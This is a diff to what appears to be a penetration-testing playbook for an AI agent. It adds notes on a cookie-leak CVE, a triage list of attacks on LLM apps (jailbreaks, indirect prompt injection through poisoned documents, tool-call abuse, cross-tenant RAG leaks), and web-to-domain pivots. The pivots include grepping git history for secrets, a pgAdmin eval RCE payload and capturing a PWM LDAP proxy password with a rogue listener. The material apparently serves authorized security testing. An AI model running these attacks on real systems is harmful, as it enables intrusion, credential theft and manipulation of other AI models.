@@ -40,6 +40,16 @@ Patterns that repeat across products:
 - attachment or document processors with side-fetch behavior
 - optimistic trust in public keys, import maps, or external config
 - JNDI lookups in logged/evaluated strings (Log4Shell pattern — any Java app using Log4j 2.x < 2.17)
+- error-page reflection of request data — e.g. **Apache CVE-2012-0053**: an oversized `Cookie` header on old 2.2.x triggers a 400 whose error page reflects the offending cookie, leaking `HttpOnly` cookies to any XSS that can read the response body.
+
+## LLM / AI chatbot targets
+
+When the app is an LLM front-end, RAG pipeline, or agent with tools, the security lane is separate from generic web bugs — load the `llm-technique` skill for the OWASP LLM Top 10 workflow. Fast-triage anchors:
+
+- **Direct jailbreak** (system-override, role-reversal, instruction-leak) — the noisiest lane; often mitigated.
+- **Indirect prompt injection** — poison a retrieved doc, uploaded file, URL preview, or tool output the model ingests; the payload runs in the assistant turn, not the user turn.
+- **Tool / function-call abuse** — if the app wires the LLM to server tools (search, fetch, DB, shell), coax the model into invoking a tool with attacker-chosen args; the app trusts the tool response for auth or state changes.
+- **RAG cross-tenant leak** — "summarize the newest doc" / "cite chunk id N" enumerates other users' indexed content when the retriever lacks tenant scoping.
 
 ## Log4Shell and JNDI family (CVE-2021-44228)
 
@@ -67,6 +77,33 @@ Framework routing:
 
 Document and media processors:
 - If upload handling invokes PDF/image/Office converters, model both the parser and the fetcher: local file reads, SSRF, attachment embedding, metadata execution, and archive expansion are separate lanes.
+
+## AD-integrated web apps (web → domain pivots)
+
+On Windows/AD boxes the web tier is usually the door to a domain credential. Fingerprint these and
+route the loot into the AD phase (`active-directory-technique`).
+
+- **Gitea / GitLab / Gogs**: authenticate with any reused cred (`/api/v1/user`), enumerate repos
+  (`/api/v1/repos/search`). **Mine full git history** — `.env`/`DATABASE_URL`/`SECRET_KEY` deleted in a
+  later commit still live: `git log --all -p | grep -iE 'pass|secret|_url|token'`. With DB access to
+  Gitea's backing store you can read every repo/user.
+- **pgAdmin 4 ≤ 9.1 — CVE-2025-2945 (authenticated Query Tool RCE)**: two `eval()` sinks —
+  `query_commited` in `POST /sqleditor/query_tool/download/<tid>` and `high_availability` in
+  `/cloud/deploy`. Needs pgAdmin login + valid **DB creds** to init the SQL editor (get a trans_id via
+  `/sqleditor/initialize/sqleditor/<tid>/<sgid>/<sid>/<did>`), then send a Python expression
+  (`__import__("os").system(...)`). CSRF is session-bound (token from `/login` works for all API
+  calls). RCE runs as the pgAdmin service acct — usually a container; pivot from there.
+- **PWM (password self-service) — recover the LDAP proxy credential**: PWM binds to AD with a service
+  account. Routes to its cleartext:
+  - **Read the config file** (`PwmConfiguration.xml`, if you reach the host): `ldap.proxy.username` is
+    plaintext; `ldap.proxy.password` is `ENC-PW:` (key = config `createTime` + `"StoredConfiguration"`).
+  - **Rogue-LDAP capture (deterministic)**: crack the config password (bcrypt in
+    `configPasswordHash`, often low cost → rockyou), log into `/pwm/private/config/login`, point
+    `ldap.serverUrls` at `ldap://<you>:389`, then trigger `processAction=ldapHealthCheck` in the config
+    editor. PWM sends a cleartext simple bind (DN + password in the first PDU) — catch it with a raw
+    socket. Same idea when PWM is in configuration mode (editor open, no password).
+  - PWM self-service is gated behind `ERROR_APPLICATION_NOT_RUNNING (5084)` until the config is
+    "restricted" — config/editor still binds the proxy, which is all you need.
 
 ## Triage workflow
 
